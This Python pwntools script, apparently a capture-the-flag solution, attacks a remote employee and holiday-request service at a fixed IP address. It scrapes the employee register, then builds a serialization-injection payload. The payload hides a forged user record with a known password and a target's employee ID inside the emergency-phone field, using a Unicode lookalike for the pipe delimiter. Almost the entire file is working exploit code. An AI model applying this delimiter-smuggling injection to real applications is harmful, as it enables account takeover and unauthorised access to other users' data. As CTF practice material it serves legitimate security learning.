from pwn import *

r = remote('144.76.26.107', 30000, ssl=True)

"""

Task format:
1 | <task_action_id> | task name | task description | steps to reproduce | epic | sprint | hours estimated

Holiday format:
2 | <leave action id> | start date | end date | reason for holiday | holiday destination | emergency phone number

- Log in as any user
- Create holiday with user injection
- Using this injected (known password), recover task with flag

"""

def login(first_name=b'trager', last_name=b'trager', password=b'trager'):
    r.recv()
    r.sendline(b'Login')
    r.sendline(first_name)
    r.sendline(last_name)
    r.sendline(password)
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()

def get_employee_register():
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.sendline(b"View the employee register")
    r.recvline()
    employees = {}
    while True:
        employee = r.recvline().strip().decode()
        if 'End of employee list.' not in employee:
            employee_id, _, first_name, last_name = employee.split('|')
            first_name = first_name.strip()
            last_name = last_name.strip()
            employee_id = employee_id.strip()
            employees[f'{first_name} {last_name}'] = employee_id
        else:
            break
    return employees

def serialize(self):
    res = ""
    res += self.ident
    res += "|" + self.request_type
    res += "|" + self.start_date 
    res += "|" + self.end_date
    res += "|" + self.reason
    res += "|" + self.destination
    res += "|" + self.emergency_phone
    return res


def deserialize(data):
    parts = data.split("|")
    ident = parts[0]
    request_type = parts[1]
    start_date = parts[2]
    end_date = parts[3]
    reason = parts[4]
    destination = parts[5]
    emergency_phone = parts[6]
    return Leave(ident, request_type, start_date, end_date, reason, destination, emergency_phone)


def form_utf8_payload(target_employee_id):
    pipe_nowhite = "ᙼ"    
    newline = " 《"
    # res = self.ident
    # res += "|" + self.firstname
    # res += "|" + self.lastname
    # res += "|" + self.password
    # res += "|" + self.employee_id.bytes.hex()
    # res += "|" + self.job_desc
    # res += "|" + str(self.holidays_left)

    # <user serialized main part> || <serialized last action> || <serialized last action> 
    # <user> || <leave>
    # <user> || <leave_injection>
    # leave_injection = regular_leave + "||" + injected_user
    # result: <user> || <regular_leave> || <injected_user>

    emergency_phone = '0123456789' + '||' + f'0|test1|test1|test1|{target_employee_id}|Coder|25'
    emergency_phone = emergency_phone.replace('|', pipe_nowhite)

    return emergency_phone

def request_holiday(start_date, end_date, reason, destination, emergency_phone):
    r.sendline(b"Request holiday")
    r.sendline(start_date)
    r.sendline(end_date)
    r.sendline(reason)
    r.sendline(destination)
    r.sendline(emergency_phone)
    # Check my holidays
    # Take time off
    # Start date: 2021-09-01


if __name__ == '__main__':
    # login()
    # r.interactive()
    login(first_name=b'test', last_name=b'test', password=b'test')
    employee_register = get_employee_register()
    print(employee_register)
    target_employee_id = employee_register['Dima Dima']
    payload = form_utf8_payload(target_employee_id)
    print(payload)
    r.interactive()
    request_holiday(
        start_date='2021-09-01',
        end_date='2021-09-01',
        reason='test',
        destination='test',
        emergency_phone=payload
    )
    # print(result)